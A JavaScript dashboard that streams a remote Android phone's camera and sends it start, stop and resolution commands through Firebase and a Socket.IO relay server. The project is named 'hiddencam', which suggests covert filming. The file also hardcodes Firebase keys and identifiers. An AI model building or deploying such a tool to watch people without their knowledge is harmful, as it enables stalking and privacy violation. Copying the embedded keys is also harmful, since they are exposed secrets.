// ============ Firebase Config (Aapki JSON se) ============
const firebaseConfig = {
    apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
    authDomain: "hiddencam-62e2d.firebaseapp.com",
    databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",  // Yeh add karna hoga!
    projectId: "hiddencam-62e2d",
    storageBucket: "hiddencam-62e2d.firebasestorage.app",
    messagingSenderId: "931792860891",
    appId: "1:931792860891:android:602d1099f876f4688d7efe"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Global variables
let currentDeviceId = localStorage.getItem('cctv_device_id') || '';
let socket = null;
let reconnectInterval = null;

// ============ Socket.IO Connection (Render Server) ============
const RENDER_SERVER_URL = 'https://server-3-phat.onrender.com';

function connectToStream() {
    if (socket) {
        socket.disconnect();
    }
    
    socket = io(RENDER_SERVER_URL, {
        transports: ['websocket'],
        reconnection: true
    });
    
    socket.on('connect', () => {
        addLog('✅ Connected to stream server');
        socket.emit('register_viewer');
    });
    
    socket.on('frame', (data) => {
        const blob = new Blob([data], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        const img = document.getElementById('liveFrame');
        img.src = url;
        document.getElementById('streamStatus').innerHTML = '🟢 LIVE STREAM (15 FPS)';
        setTimeout(() => URL.revokeObjectURL(url), 100);
    });
    
    socket.on('disconnect', () => {
        addLog('⚠️ Disconnected from stream server');
        document.getElementById('streamStatus').innerHTML = '⚫ Stream disconnected';
    });
    
    socket.on('connect_error', (err) => {
        addLog('❌ Stream server error: ' + err.message);
    });
}

// ============ Send Command to Android via Firebase ============
function sendCommand(command) {
    if (!currentDeviceId) {
        alert('Please enter and save Device ID first!');
        return;
    }
    
    addLog(`📤 Sending command: ${command}`);
    
    // Send command to Firebase
    database.ref(`camera/${currentDeviceId}/command`).set(command)
        .then(() => {
            addLog(`✅ Command "${command}" sent successfully`);
        })
        .catch((error) => {
            addLog(`❌ Error sending command: ${error.message}`);
        });
    
    // Special handling for resolution commands
    if (command === 'resolution_120p') {
        document.getElementById('resolutionDisplay').innerText = '120p';
    } else if (command === 'resolution_240p') {
        document.getElementById('resolutionDisplay').innerText = '240p';
    }
}

// ============ Listen to Android App Status ============
function listenToDeviceStatus() {
    if (!currentDeviceId) return;
    
    const statusRef = database.ref(`camera/${currentDeviceId}`);
    
    statusRef.on('value', (snapshot) => {
        const data = snapshot.val();
        if (!data) {
            updateUI('offline', null);
            return;
        }
        
        // Update UI based on status
        updateUI(data.status || 'offline', data);
        
        // Update last seen
        if (data.lastSeen) {
            const lastSeen = new Date(data.lastSeen);
            document.getElementById('lastSeen').innerText = lastSeen.toLocaleTimeString();
        }
        
        // Update resolution
        if (data.currentResolution) {
            document.getElementById('resolutionDisplay').innerText = data.currentResolution;
        }
        
        // Update stream URL
        if (data.streamUrl) {
            document.getElementById('streamUrlDisplay').innerText = data.streamUrl;
        }
    });
}

function updateUI(status, data) {
    const dot = document.getElementById('statusDot');
    const text = document.getElementById('statusText');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    
    // Remove all classes first
    dot.className = 'status-dot';
    
    switch(status) {
        case 'online':
            dot.classList.add('online');
            text.innerHTML = '🟢 ONLINE - Streaming Active';
            startBtn.disabled = true;
            stopBtn.disabled = false;
            break;
        case 'ready':
            dot.classList.add('ready');
            text.innerHTML = '🟠 READY - Camera ready, waiting for START';
            startBtn.disabled = false;
            stopBtn.disabled = true;
            break;
        case 'offline':
            dot.classList.add('offline');
            text.innerHTML = '🔴 OFFLINE - Camera off';
            startBtn.disabled = false;
            stopBtn.disabled = true;
            break;
        case 'permission_denied':
            dot.classList.add('offline');
            text.innerHTML = '⚠️ PERMISSION DENIED - Grant camera permission on phone';
            startBtn.disabled = true;
            stopBtn.disabled = true;
            break;
        default:
            dot.classList.add('offline');
            text.innerHTML = '⚫ UNKNOWN - Device not responding';
            startBtn.disabled = false;
            stopBtn.disabled = true;
    }
}

// ============ Device ID Management ============
function saveDeviceId() {
    const deviceIdInput = document.getElementById('deviceId');
    const newDeviceId = deviceIdInput.value.trim();
    
    if (!newDeviceId) {
        alert('Please enter a valid Device ID');
        return;
    }
    
    currentDeviceId = newDeviceId;
    localStorage.setItem('cctv_device_id', currentDeviceId);
    document.getElementById('deviceIdDisplay').innerText = currentDeviceId;
    
    addLog(`📱 Device ID saved: ${currentDeviceId}`);
    
    // Re-listen to status
    listenToDeviceStatus();
}

function loadSavedDeviceId() {
    if (currentDeviceId) {
        document.getElementById('deviceId').value = currentDeviceId;
        document.getElementById('deviceIdDisplay').innerText = currentDeviceId;
        listenToDeviceStatus();
    }
}

// ============ Add Log Entry ============
function addLog(message) {
    const logContainer = document.getElementById('logContainer');
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    const timestamp = new Date().toLocaleTimeString();
    logEntry.innerHTML = `[${timestamp}] ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    
    // Keep only last 20 logs
    while (logContainer.children.length > 20) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

// ============ Keep Alive ============
setInterval(() => {
    if (currentDeviceId) {
        database.ref(`camera/${currentDeviceId}/ping`).set(Date.now());
    }
}, 30000);  // Every 30 seconds

// ============ Initialize ============
document.addEventListener('DOMContentLoaded', () => {
    connectToStream();
    loadSavedDeviceId();
    addLog('🚀 Dashboard initialized');
    addLog(`📡 Firebase connected to project: hiddencam-62e2d`);
    addLog(`🎥 Render server: ${RENDER_SERVER_URL}`);
});
